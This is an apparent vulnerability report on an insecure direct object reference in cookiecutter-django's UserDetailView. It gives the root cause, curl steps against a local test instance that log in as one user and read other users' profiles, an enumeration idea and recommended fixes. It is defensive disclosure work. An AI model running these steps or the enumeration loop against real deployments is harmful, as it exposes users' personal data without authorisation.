# Vulnerability Report: IDOR in cookiecutter-django UserDetailView

**Project:** cookiecutter-django
**Version:** 2026.03.06 (commit `1e18459`)
**Date:** 2026-03-10
**Severity:** HIGH
**Type:** Insecure Direct Object Reference (IDOR) / Broken Access Control
**OWASP:** A01:2021 - Broken Access Control
**CWE:** CWE-639 - Authorization Bypass Through User-Controlled Key

---

## 1. Summary

`UserDetailView` in the generated Django project requires authentication (`LoginRequiredMixin`) but performs **no ownership check**. Any authenticated user can view any other user's profile by navigating to `/users/<username>/` (username mode) or `/users/<id>/` (email mode). The view queries the unrestricted `User.objects.all()` queryset by default.

This is in direct contrast with the API layer (`UserViewSet` / Django Ninja views), which correctly restricts the queryset to the current user via `User.objects.filter(id=self.request.user.id)`.

---

## 2. Affected File

**Template source:**

```
{{cookiecutter.project_slug}}/{{cookiecutter.project_slug}}/users/views.py (lines 13-21)
```

**Generated code (username mode):**

```python
class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    slug_field = "username"
    slug_url_kwarg = "username"
```

**Generated code (email mode):**

```python
class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    slug_field = "id"
    slug_url_kwarg = "id"
```

**URL routing (`urls.py`):**

```python
# username mode
path("<str:username>/", view=user_detail_view, name="detail"),
# email mode
path("<int:pk>/", view=user_detail_view, name="detail"),
```

---

## 3. Root Cause

Django's `DetailView` uses `self.model.objects.all()` as the default queryset when no `get_queryset()` override is provided. Combined with only `LoginRequiredMixin` (which checks authentication but not authorization), any logged-in user can retrieve any `User` object by supplying the target's username or integer PK in the URL.

---

## 4. Exploitation Scenario

### 4.1 Prerequisites

- An attacker has a valid account on the application (any privilege level).

### 4.2 Steps to Reproduce

**Environment setup:**

```bash
# 1. Generate project from template (with Docker)
cd /tmp/cc-django-src
uv run cookiecutter . --no-input --output-dir=/tmp/debug use_docker=y

# 2. Start services
cd /tmp/debug/my_awesome_project
docker compose -f docker-compose.local.yml up -d

# 3. Create test users (inside container)
docker compose -f docker-compose.local.yml exec \
  -e DATABASE_URL="postgres://<user>:<pass>@postgres:5432/my_awesome_project" \
  django python manage.py shell -c "
from my_awesome_project.users.models import User
from allauth.account.models import EmailAddress

alice = User.objects.create_user(username='alice', password='testpass123',
                                  email='alice@test.com', name='Alice Secret Info')
bob = User.objects.create_user(username='bob', password='testpass123',
                                email='bob@test.com', name='Bob Private Data')
admin = User.objects.create_superuser(username='admin', password='admin123',
                                       email='admin@test.com', name='Admin User')

for u in User.objects.all():
    EmailAddress.objects.update_or_create(
        user=u, email=u.email,
        defaults={'verified': True, 'primary': True}
    )
"
```

**Attack execution:**

```bash
# Step 1: Login as alice, obtain session cookie
curl -s -c /tmp/cookies.txt http://127.0.0.1:9090/accounts/login/ > /tmp/login.html
CSRF=$(grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' /tmp/login.html)

curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:9090/accounts/login/ \
  -d "csrfmiddlewaretoken=${CSRF}&login=alice&password=testpass123" \
  -H "Referer: http://127.0.0.1:9090/accounts/login/" -o /dev/null

# Step 2: Access other users' profiles (IDOR)
curl -s -b /tmp/cookies.txt http://127.0.0.1:9090/users/bob/
curl -s -b /tmp/cookies.txt http://127.0.0.1:9090/users/admin/
```

### 4.3 Verified Results

| Request (as alice) | URL | HTTP Status | Data Leaked |
|---|---|---|---|
| Own profile | `/users/alice/` | **200** | `Alice Secret Info` |
| Bob's profile | `/users/bob/` | **200** | `Bob Private Data` |
| Admin's profile | `/users/admin/` | **200** | `Admin User` |
| API - Bob's data | `/api/users/bob/` | **404** | None (correctly blocked) |

Alice successfully retrieved the `name` field of Bob and Admin via the web view, while the same request through the API was correctly denied.

---

## 5. Impact

### 5.1 Direct Impact

- **User enumeration:** Attackers can iterate over usernames or integer IDs to discover all user accounts in the system.
- **PII disclosure:** The default template exposes `username` and `name`. In real-world deployments, developers commonly extend the User model and template with sensitive fields (phone number, address, bio, avatar, etc.), amplifying the data exposure.
- **Privilege mapping:** Identifying the `admin` account and other privileged users enables targeted attacks (phishing, credential stuffing, social engineering).

### 5.2 Amplification in email/PK Mode

When `username_type=email`, the URL pattern is `<int:pk>/`, making enumeration trivial:
```
/users/1/, /users/2/, /users/3/, ...
```
An attacker can script a simple loop to dump all user profiles.

### 5.3 Context: cookiecutter-django Reach

This is a **project template** used by thousands of Django projects. Every project generated from this template inherits this vulnerability by default, creating a widespread supply-chain impact.

---

## 6. Comparison: Web View vs API View

The API layer already implements the correct access control pattern:

**API View (DRF) - SECURE:**
```python
class UserViewSet(RetrieveModelMixin, ListModelMixin, UpdateModelMixin, GenericViewSet):
    queryset = User.objects.all()

    def get_queryset(self, *args, **kwargs):
        assert isinstance(self.request.user.id, int)
        return self.queryset.filter(id=self.request.user.id)  # Only own data
```

**API View (Django Ninja) - SECURE:**
```python
def _get_users_queryset(request) -> QuerySet[User]:
    return User.objects.filter(pk=request.user.pk)  # Only own data
```

**Web View - VULNERABLE:**
```python
class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    slug_field = "username"
    slug_url_kwarg = "username"
    # No get_queryset() override -> uses User.objects.all()
```

**`UserUpdateView` - SECURE (same file):**
```python
class UserUpdateView(LoginRequiredMixin, SuccessMessageMixin, UpdateView):
    def get_object(self, queryset=None):
        return self.request.user  # Only own data
```

The inconsistency between `UserDetailView` (no restriction) and `UserUpdateView` / API views (properly restricted) confirms this is an oversight, not intentional design.

---

## 7. Recommended Fix

### Option A: Restrict to Own Profile Only

If user profiles should be private (most common case):

```python
class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    slug_field = "username"
    slug_url_kwarg = "username"

    def get_queryset(self):
        return User.objects.filter(pk=self.request.user.pk)
```

### Option B: Keep as User Directory (Document the Behavior)

If viewing other users' profiles is intentional (e.g., social platform), the behavior should be:

1. Explicitly documented in project comments and README
2. The template should be audited to ensure only non-sensitive fields are displayed
3. Rate limiting should be applied to prevent bulk enumeration

### Option C: Redirect to Own Profile

Simplest approach - make the detail view always show the current user:

```python
class UserDetailView(LoginRequiredMixin, DetailView):
    model = User

    def get_object(self, queryset=None):
        return self.request.user
```

---

## 8. References

- [OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [Django DetailView documentation](https://docs.djangoproject.com/en/stable/ref/class-based-views/generic-display/#detailview)
- cookiecutter-django source: `{{cookiecutter.project_slug}}/{{cookiecutter.project_slug}}/users/views.py`
